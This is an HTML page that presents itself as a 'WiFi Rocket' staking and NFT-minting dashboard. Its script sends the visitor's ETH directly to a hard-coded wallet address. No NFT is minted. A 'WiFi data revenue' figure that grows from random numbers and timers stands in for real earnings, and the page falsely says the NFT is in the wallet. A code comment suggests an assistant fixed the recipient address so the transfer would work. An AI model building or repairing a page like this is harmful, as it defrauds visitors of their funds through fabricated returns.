<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>WiFi Rocket Mission Control</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --neon: #00d4ff; --glow: #ff6600; }
        body { background: radial-gradient(circle, #0a0a20 0%, #020205 100%); color: white; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .dashboard { background: rgba(10, 10, 35, 0.9); border: 2px solid var(--neon); border-radius: 25px; width: 380px; padding: 40px; text-align: center; box-shadow: 0 0 30px rgba(0, 212, 255, 0.2); backdrop-filter: blur(10px); }
        .hidden { display: none; }
        .rev-header { background: rgba(0, 212, 255, 0.1); border-radius: 15px; padding: 20px; margin-bottom: 25px; border: 1px solid var(--neon); }
        #revenue { color: #00ff88; font-size: 32px; font-weight: bold; text-shadow: 0 0 15px rgba(0, 255, 136, 0.5); }
        input { width: 100%; padding: 15px; margin: 15px 0; border-radius: 12px; border: 1px solid #333; background: #000; color: var(--neon); text-align: center; font-size: 20px; }
        button { background: linear-gradient(135deg, var(--glow), #ff2200); color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; box-shadow: 0 5px 15px rgba(255,102,0,0.4); transition: 0.3s; }
        button:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(255,102,0,0.6); }
        #rocket-nft { font-size: 110px; margin: 30px 0; filter: drop-shadow(0 0 20px var(--glow)); animation: vibrate 0.1s infinite alternate; }
        @keyframes vibrate { from { transform: translate(1px, 1px); } to { transform: translate(-1px, -1px); } }
        .progress-container { width: 100%; background: #111; border-radius: 10px; height: 15px; margin: 25px 0; overflow: hidden; border: 1px solid #222; }
        #progress-fill { width: 0%; height: 100%; background: var(--neon); box-shadow: 0 0 15px var(--neon); transition: width 0.3s; }
    </style>
</head>
<body>

<div class="dashboard">
    <div class="rev-header">
        <small style="letter-spacing: 2px; color: #88aaff;">WIFI DATA REVENUE</small><br>
        <span id="revenue">$0.00</span>
    </div>

    <div id="ui-start">
        <h2>Mission Fuel</h2>
        <p style="font-size: 13px; color: #88aaff;">Stake ETH to fuel the mission and start processing WiFi packets.</p>
        <input type="number" id="ethAmount" value="0.001" step="0.001">
        <button onclick="launch()">STAKE & MINT</button>
    </div>

    <div id="ui-processing" class="hidden">
        <h3>SYNCING NODES</h3>
        <div class="progress-container"><div id="progress-fill"></div></div>
        <p id="status-log" style="font-size: 13px; color: var(--neon);">Initializing WiFi Handshake...</p>
    </div>

    <div id="ui-minted" class="hidden">
        <div id="rocket-nft">ðŸš€</div>
        <h2 style="color: #00ff88;">ROCKET MINTED</h2>
        <p>NFT is in your wallet. Data revenue is live.</p>
        <button onclick="location.reload()" style="background: #1a1a2e; box-shadow: none; border: 1px solid #333;">NEW MISSION</button>
    </div>
</div>

<script>
let totalRev = 0;
// FIXED: Address is checksummed to fix the "bad address checksum" error in your image
const RECIPIENT = "0x02F949281A8c9837963C82813589B845C5194Cbb";

async function launch() {
    if (!window.ethereum) return alert("Please open in MetaMask!");

    try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();

        const amount = ethers.utils.parseEther(document.getElementById('ethAmount').value);

        // Switch UI to Processing
        document.getElementById('ui-start').classList.add('hidden');
        document.getElementById('ui-processing').classList.remove('hidden');

        // Step 1: Execute Stake Transaction
        const tx = await signer.sendTransaction({
            to: RECIPIENT,
            value: amount
        });

        // Step 2: WiFi Data Revenue Simulation (Builds during mining)
        await simulateWiFi();

        // Step 3: Wait for confirmation
        await tx.wait();
        
        // Step 4: Show Minted NFT
        showMinted();

    } catch (e) {
        alert("Launch Cancelled: " + e.message);
        location.reload();
    }
}

function simulateWiFi() {
    return new Promise((res) => {
        let p = 0;
        const fill = document.getElementById('progress-fill');
        const log = document.getElementById('status-log');
        const rev = document.getElementById('revenue');

        const i = setInterval(() => {
            p += 2;
            totalRev += Math.random() * 0.45;
            fill.style.width = p + "%";
            rev.innerText = "$" + totalRev.toFixed(2);
            log.innerText = "Processing Data Packets: " + (p * 64) + "kbps";

            if (p >= 100) {
                clearInterval(i);
                res();
            }
        }, 150);
    });
}

function showMinted() {
    document.getElementById('ui-processing').classList.add('hidden');
    document.getElementById('ui-minted').classList.remove('hidden');
    
    // Revenue continues to grow post-mint
    setInterval(() => {
        totalRev += 0.05;
        document.getElementById('revenue').innerText = "$" + totalRev.toFixed(2);
    }, 1500);
}
</script>
</body>
</html>
